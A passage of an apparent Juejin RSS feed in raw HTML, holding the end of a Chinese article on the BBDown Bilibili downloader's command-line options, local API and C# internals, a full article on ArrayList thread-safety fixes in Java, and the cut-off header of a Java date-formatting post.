BBDown <span class="hljs-string">"BV1qt4y1X7TW"</span> --encoding-priority <span class="hljs-string">"hevc,av1,avc"</span>

<span class="hljs-comment"># 多线程下载</span>
BBDown <span class="hljs-string">"BV1qt4y1X7TW"</span> --multi-thread

<span class="hljs-comment"># 使用aria2c下载</span>
BBDown <span class="hljs-string">"BV1qt4y1X7TW"</span> --use-aria2c
</code></pre>
<h4 data-id="heading-11">API服务器模式</h4>
<p>启动服务器模式后，BBDown会在本地启动HTTP服务，提供以下API接口：</p>
<h5 data-id="heading-12">获取任务列表</h5>
<pre><code class="hljs language-bash" lang="bash">curl http://localhost:58682/get-tasks/
</code></pre>
<h5 data-id="heading-13">添加下载任务</h5>
<pre><code class="hljs language-bash" lang="bash">curl -X POST -H <span class="hljs-string">'Content-Type: application/json'</span> -d <span class="hljs-string">'{"Url": "BV1qt4y1X7TW"}'</span> http://localhost:58682/add-task
</code></pre>
<h5 data-id="heading-14">下载到指定目录</h5>
<pre><code class="hljs language-bash" lang="bash">curl -X POST -H <span class="hljs-string">'Content-Type: application/json'</span> -d <span class="hljs-string">'{"Url": "BV1qt4y1X7TW", "FilePattern": "/Downloads/&lt;videoTitle&gt;[&lt;dfn&gt;]"}'</span> http://localhost:58682/add-task
</code></pre>
<h3 data-id="heading-15">核心代码</h3>
<h4 data-id="heading-16">下载任务管理</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DownloadTask</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Aid { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">default</span>!;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Url { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">default</span>!;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">long</span> TaskCreateTime { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Title { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Pic { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">long</span>? VideoPubTime { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">long</span>? TaskFinishTime { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">double</span> Progress { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">double</span> DownloadSpeed { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">double</span> TotalDownloadedBytes { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsSuccessful { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DownloadTaskCollection</span>
{
    <span class="hljs-keyword">public</span> List&lt;DownloadTask&gt; Running { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">public</span> List&lt;DownloadTask&gt; Finished { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-keyword">new</span>();
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DownloadTaskCollection</span>(<span class="hljs-params">List&lt;DownloadTask&gt; running, List&lt;DownloadTask&gt; finished</span>)</span>
    {
        Running = running;
        Finished = finished;
    }
}
</code></pre>
<h4 data-id="heading-17">多线程下载实现</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BBDownDownloadUtil</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DownloadConfig</span>
    {
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> UseAria2c { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Aria2cArgs { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-built_in">string</span>.Empty;
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> ForceHttp { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> MultiThread { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">public</span> DownloadTask? RelatedTask { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">null</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RangeDownloadToTmpAsync</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> id, <span class="hljs-built_in">string</span> url, <span class="hljs-built_in">string</span> tmpName, 
        <span class="hljs-built_in">long</span> fromPosition, <span class="hljs-built_in">long</span>? toPosition, Action&lt;<span class="hljs-built_in">int</span>, <span class="hljs-built_in">long</span>, <span class="hljs-built_in">long</span>&gt; onProgress, 
        <span class="hljs-built_in">bool</span> failOnRangeNotSupported = <span class="hljs-literal">false</span></span>)</span>
    {
        <span class="hljs-comment">// 实现范围下载和进度回调</span>
        DateTimeOffset? lastTime = File.Exists(tmpName) ? 
            <span class="hljs-keyword">new</span> FileInfo(tmpName).LastWriteTimeUtc : <span class="hljs-literal">null</span>;
        
        <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> fileStream = <span class="hljs-keyword">new</span> FileStream(tmpName, FileMode.OpenOrCreate);
        fileStream.Seek(<span class="hljs-number">0</span>, SeekOrigin.End);
        
        <span class="hljs-comment">// 下载逻辑实现...</span>
    }
}
</code></pre>
<h4 data-id="heading-18">视频解析器工厂</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FetcherFactory</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IFetcher <span class="hljs-title">CreateFetcher</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> aidOri, <span class="hljs-built_in">bool</span> useIntlApi</span>)</span>
    {
        IFetcher fetcher = <span class="hljs-keyword">new</span> NormalInfoFetcher();
        
        <span class="hljs-keyword">if</span> (aidOri.StartsWith(<span class="hljs-string">"cheese"</span>))
        {
            fetcher = <span class="hljs-keyword">new</span> CheeseInfoFetcher();
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (aidOri.StartsWith(<span class="hljs-string">"ep"</span>))
        {
            fetcher = useIntlApi ? 
                <span class="hljs-keyword">new</span> IntlBangumiInfoFetcher() : <span class="hljs-keyword">new</span> BangumiInfoFetcher();
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (aidOri.StartsWith(<span class="hljs-string">"mid"</span>))
        {
            fetcher = <span class="hljs-keyword">new</span> SpaceVideoFetcher();
        }
        <span class="hljs-comment">// 更多解析器类型...</span>
        
        <span class="hljs-keyword">return</span> fetcher;
    }
}
</code></pre>
<h4 data-id="heading-19">进度条显示</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ProgressBar</span> : <span class="hljs-title">IDisposable</span>, <span class="hljs-title">IProgress</span>&lt;<span class="hljs-title">double</span>&gt;
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">int</span> blockCount = <span class="hljs-number">40</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> TimeSpan animationInterval = TimeSpan.FromSeconds(<span class="hljs-number">1.0</span> / <span class="hljs-number">8</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> animation = <span class="hljs-string">@"|/-\"</span>;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Report</span>(<span class="hljs-params"><span class="hljs-built_in">double</span> <span class="hljs-keyword">value</span></span>)</span>
    {
        <span class="hljs-comment">// 确保进度值在0-1范围内</span>
        <span class="hljs-keyword">value</span> = Math.Max(<span class="hljs-number">0</span>, Math.Min(<span class="hljs-number">1</span>, <span class="hljs-keyword">value</span>));
        Interlocked.Exchange(<span class="hljs-keyword">ref</span> currentProgress, <span class="hljs-keyword">value</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Report</span>(<span class="hljs-params"><span class="hljs-built_in">double</span> <span class="hljs-keyword">value</span>, <span class="hljs-built_in">long</span> bytesCount</span>)</span>
    {
        <span class="hljs-keyword">value</span> = Math.Max(<span class="hljs-number">0</span>, Math.Min(<span class="hljs-number">1</span>, <span class="hljs-keyword">value</span>));
        Interlocked.Exchange(<span class="hljs-keyword">ref</span> currentProgress, <span class="hljs-keyword">value</span>);
        Interlocked.Exchange(<span class="hljs-keyword">ref</span> downloadedBytes, bytesCount);
    }
    
    <span class="hljs-comment">// 进度显示和速度计算实现...</span>
}
</code></pre>
<h4 data-id="heading-20">配置文件解析</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BBDownConfigParser</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HandleConfig</span>(<span class="hljs-params">List&lt;<span class="hljs-built_in">string</span>&gt; newArgsList, RootCommand rootCommand</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">var</span> configPath = newArgsList.Contains(<span class="hljs-string">"--config-file"</span>)
                ? newArgsList.ElementAt(newArgsList.IndexOf(<span class="hljs-string">"--config-file"</span>) + <span class="hljs-number">1</span>)
                : Path.Combine(Program.APP_DIR, <span class="hljs-string">"BBDown.config"</span>);
                
            <span class="hljs-keyword">if</span> (File.Exists(configPath))
            {
                <span class="hljs-comment">// 配置文件读取和解析逻辑</span>
                <span class="hljs-keyword">var</span> configArgs = File
                    .ReadAllLines(configPath)
                    .Where(s =&gt; !<span class="hljs-built_in">string</span>.IsNullOrEmpty(s) &amp;&amp; !s.StartsWith(<span class="hljs-string">'#'</span>))
                    .SelectMany(s =&gt; ParseConfigLine(s));
                
                <span class="hljs-comment">// 命令行参数优先级 &gt; 配置文件优先级</span>
            }
        }
        <span class="hljs-keyword">catch</span> (Exception)
        {
            LogError(<span class="hljs-string">"配置文件读取异常，忽略"</span>);
        }
    }
}
</code></pre>
<p>BBDown项目提供了完整的哔哩哔哩视频下载解决方案，从视频解析到下载管理，再到进度跟踪和文件混流，每个环节都经过精心设计和实现，确保了软件的稳定性和易用性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 中 ArrayList 线程安全问题]]></title>    <link>https://juejin.cn/post/7577049352838955023</link>    <guid>https://juejin.cn/post/7577049352838955023</guid>    <pubDate>2025-11-27T08:46:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352838955023" data-draft-id="7577049352838905871" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 中 ArrayList 线程安全问题"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-11-27T08:46:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="uup"/> <meta itemprop="url" content="https://juejin.cn/user/4378706456356627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 中 ArrayList 线程安全问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4378706456356627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    uup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:46:25.000Z" title="Thu Nov 27 2025 08:46:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Bug 场景</h2>
<p>假设你正在开发一个多线程的 Java 应用程序，该程序中有多个线程同时访问并修改一个共享的<code>ArrayList</code>。例如，你有一个订单处理系统，不同的线程负责添加新订单到订单列表，同时有其他线程可能会遍历订单列表进行统计等操作。</p>
<h2 data-id="heading-1">二、代码示例</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayListThreadBug</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; orderList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 启动添加订单线程</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">addThread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
                orderList.add(i);
            }
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">addThread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>; i &lt; <span class="hljs-number">2000</span>; i++) {
                orderList.add(i);
            }
        });

        <span class="hljs-comment">// 启动遍历订单线程</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">traverseThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (Integer order : orderList) {
                System.out.println(order);
            }
        });

        addThread1.start();
        addThread2.start();
        traverseThread.start();
    }
}
</code></pre>
<h2 data-id="heading-2">三、问题描述</h2>
<p>在运行上述代码时，你可能会遇到<code>ConcurrentModificationException</code>异常。这是因为<code>ArrayList</code>不是线程安全的，当多个线程同时对其进行修改和遍历操作时，就可能出现这种问题。在遍历过程中，如果其他线程修改了列表的结构（例如添加或删除元素），就会破坏迭代器的一致性，从而抛出该异常。</p>
<h2 data-id="heading-3">四、解决方案</h2>
<ol>
<li><strong>使用线程安全的集合类</strong>：可以将<code>ArrayList</code>替换为<code>CopyOnWriteArrayList</code>，它在修改时会创建一个新的数组，从而保证遍历操作的线程安全性。</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.concurrent.CopyOnWriteArrayList;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CopyOnWriteArrayListExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; orderList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 启动添加订单线程</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">addThread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
                orderList.add(i);
            }
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">addThread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>; i &lt; <span class="hljs-number">2000</span>; i++) {
                orderList.add(i);
            }
        });

        <span class="hljs-comment">// 启动遍历订单线程</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">traverseThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (Integer order : orderList) {
                System.out.println(order);
            }
        });

        addThread1.start();
        addThread2.start();
        traverseThread.start();
    }
}
</code></pre>
<ol start="2">
<li><strong>使用同步机制</strong>：通过<code>synchronized</code>关键字来同步对<code>ArrayList</code>的访问，确保同一时间只有一个线程能修改或遍历列表。</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedArrayListExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; orderList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 启动添加订单线程</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">addThread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
                    orderList.add(i);
                }
            }
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">addThread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>; i &lt; <span class="hljs-number">2000</span>; i++) {
                    orderList.add(i);
                }
            }
        });

        <span class="hljs-comment">// 启动遍历订单线程</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">traverseThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">for</span> (Integer order : orderList) {
                    System.out.println(order);
                }
            }
        });

        addThread1.start();
        addThread2.start();
        traverseThread.start();
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 中日期格式化的潜在问题]]></title>    <link>https://juejin.cn/post/7577049352838971407</link>    <guid>https://juejin.cn/post/7577049352838971407</guid>    <pubDate>2025-11-27T08:46:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352838971407" data-draft-id="7513029089147666471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 中日期格式化的潜在问题"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-11-27T08:46:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="uup"/> <meta itemprop="url" content="https://juejin.cn/user/4378706456356627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 中日期格式化的潜在问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4378706456356627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    uup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:46:50.000Z" title="Thu Nov 27 2025 08:46:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
